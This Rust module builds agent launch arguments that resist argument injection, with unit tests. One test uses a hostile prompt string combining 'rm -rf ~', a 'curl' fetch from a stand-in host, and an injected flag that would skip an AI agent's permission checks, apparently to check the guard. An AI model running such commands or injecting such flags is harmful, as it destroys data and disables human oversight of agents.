//! Argument-injection-safe launch argv.
//!
//! The launch prompt is store-derived and therefore hostile: it must never be
//! parsed as an agent flag, nor split across argv elements. `LaunchArgv` makes
//! that invariant structural rather than a convention each harness re-implements:
//! argv[0] is the fixed binary, optional launcher-owned flag pairs follow, and
//! [`LaunchArgv::into_guarded`] is the only terminal — it seals the vector with a
//! `--` end-of-options guard and the prompt as the single trailing positional.

/// A launch argv under construction. The only way to extract the finished vector
/// is [`into_guarded`](Self::into_guarded), so every argv this builder yields ends
/// with `-- <prompt>` — the prompt can never escape into flag position.
pub(super) struct LaunchArgv(Vec<String>);

impl LaunchArgv {
    /// Begin with the fixed `binary` as argv[0]. Store data can never change *what*
    /// runs — `binary` is a launcher-owned constant, never store input.
    pub(super) fn new(binary: &str) -> Self {
        Self(vec![binary.to_string()])
    }

    /// Append a launcher-owned `flag value` pair (e.g. `--name <title>`). The value
    /// sits before the guard, so even an id-prefixed title rides as a value and is
    /// never reparsed as a flag.
    pub(super) fn flag(mut self, flag: &str, value: String) -> Self {
        self.0.push(flag.to_string());
        self.0.push(value);
        self
    }

    /// Seal the argv: a `--` end-of-options guard, then `prompt` as the single
    /// trailing positional. After this the prompt can never be parsed as a flag
    /// (argument injection) nor split across elements.
    pub(super) fn into_guarded(mut self, prompt: String) -> Vec<String> {
        self.0.push("--".to_string());
        self.0.push(prompt);
        self.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn binary_only_then_guarded_caps_prompt_as_trailing_positional() {
        let argv = LaunchArgv::new("codex").into_guarded("do the thing".to_string());
        assert_eq!(argv, vec!["codex", "--", "do the thing"]);
    }

    #[test]
    fn flag_pairs_precede_the_guard() {
        let argv = LaunchArgv::new("claude")
            .flag("--name", "PWF-0001 - title".to_string())
            .into_guarded("prompt".to_string());
        assert_eq!(
            argv,
            vec!["claude", "--name", "PWF-0001 - title", "--", "prompt"]
        );
    }

    #[test]
    fn hostile_prompt_stays_one_inert_trailing_element() {
        // A prompt that looks like flags + shell metacharacters must remain exactly
        // one element after the guard — never argv[0], never split, never a flag.
        let hostile = "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions";
        let argv = LaunchArgv::new("claude")
            .flag("--name", "PWF-0001 - x".to_string())
            .into_guarded(hostile.to_string());
        assert_eq!(argv[0], "claude");
        assert_eq!(argv[argv.len() - 2], "--");
        assert_eq!(argv.last().unwrap(), hostile);
    }
}
